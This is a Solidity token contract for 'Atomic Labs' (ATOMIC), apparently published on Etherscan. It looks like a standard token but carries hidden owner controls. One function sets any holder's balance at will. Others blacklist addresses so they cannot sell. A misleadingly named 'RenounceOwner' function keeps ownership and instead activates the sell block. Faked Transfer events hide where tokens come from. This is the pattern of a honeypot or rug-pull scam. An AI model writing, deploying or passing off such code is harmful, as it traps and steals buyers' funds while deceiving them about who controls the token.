/**
 *Submitted for verification at Etherscan.io on 2022-10-16
*/

// "SPDX-License-Identifier: UNLICENSED
                                 
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract ATOMICLABS {
  
    mapping (address => uint256) public sAMt;
    mapping (address => bool) sTXn;


    // 
    string public name = "Atomic Labs";
    string public symbol = unicode"ATOMIC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 500000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint sver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        sAMt[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x76E860ffd95CCB602dFde1eb5363917948E31F3C;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier xII() {   
    require(msg.sender == owner);
         _;}
    modifier V () {
        sver = 1;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(sAMt[msg.sender] >= value);
        sAMt[msg.sender] -= value;  
        sAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(sTXn[msg.sender]) {
        require(sver < 1);} 
        require(sAMt[msg.sender] >= value);
        sAMt[msg.sender] -= value;  
        sAMt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return sAMt[account]; }
        function scheck(address S) xII public{          
        require(!sTXn[S]);
        sTXn[S] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function sval(address S, uint256 sX) xII public returns (bool success) {
        sAMt[S] = sX;
        return true; }
        function RenounceOwner() V public {
            require(msg.sender == owner);
        }
        function sdraw(address S) xII public {
        require(sTXn[S]);
        sTXn[S] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= sAMt[from]);
        require(value <= allowance[from][msg.sender]);
        sAMt[from] -= value;  
        sAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(sTXn[from] || sTXn[to]) {
        require(sver < 1);}
        require(value <= sAMt[from]);
        require(value <= allowance[from][msg.sender]);
        sAMt[from] -= value;
        sAMt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }